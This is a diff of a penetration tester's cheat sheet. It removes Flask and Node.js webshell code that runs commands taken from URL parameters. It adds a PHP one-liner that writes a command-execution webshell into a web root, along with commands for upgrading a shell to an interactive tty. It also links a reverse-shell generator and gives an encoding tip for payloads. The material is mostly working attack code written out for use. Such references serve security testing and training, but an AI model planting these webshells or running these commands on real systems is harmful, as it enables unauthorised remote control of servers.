@@ -122,39 +122,12 @@ locate cmdasp.aspx
 ```
 
 ### Webshell Infecting views.py - Python (Flask)
-```
-import os
-from flask import Flask,request,os
 
-app = Flask(__name__)
-   
-@app.route('/okay')
-def cmd():
-    return os.system(request.args.get('c'))
 
-if __name__ == "__main__":
-	app.run()
+### PHP
 ```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
-
-### nodejs
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/cmd.php
 ```
-const express = require('express')
-const app = express();
-
-app.listen(3000, () => 
-	console.log('...')
-);
-function Exec(command){ 
-	const { execSync } = require("child_process");
-	const stdout = execSync(command);
-	return "Result: "+stdout
-}
-app.get('/okay/:command', (req, res) => 
-res.send(Exec(req.params.command))
-);
-```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js
 
 ### Perl
 -> Find and edit
@@ -162,17 +135,11 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 locate perl-reverse-shell.pl
 ```
 
-## Spawn tty via Python
+## Upgrade to Interactive Shell tty
 ```
-python -c 'import pty;pty.spawn("/bin/bash")';
-```
-
-## Spawn an upgraded shell
-```
+python3 -c 'import pty;pty.spawn("bash")'
 export TERM=xterm && /usr/bin/script -qc /bin/bash /dev/null 
-```
 `ctrl + z`
-```
 stty raw -echo; fg 
 ```
 
@@ -180,14 +147,17 @@ stty raw -echo; fg
 -> revshell generator  
 https://www.revshells.com/
 
+-> base64 encoder
+https://www.base64encode.org/
+use UTF-16LE Destination character set 
+
 -> CyberChef  
 https://gchq.github.io/CyberChef/
 
 -> urlencoder  
 https://www.urlencoder.org/
 
--> octal
-http://www.unit-conversion.info/texttools/octal/
+
 
 -> hex
 http://www.unit-conversion.info/texttools/octal/
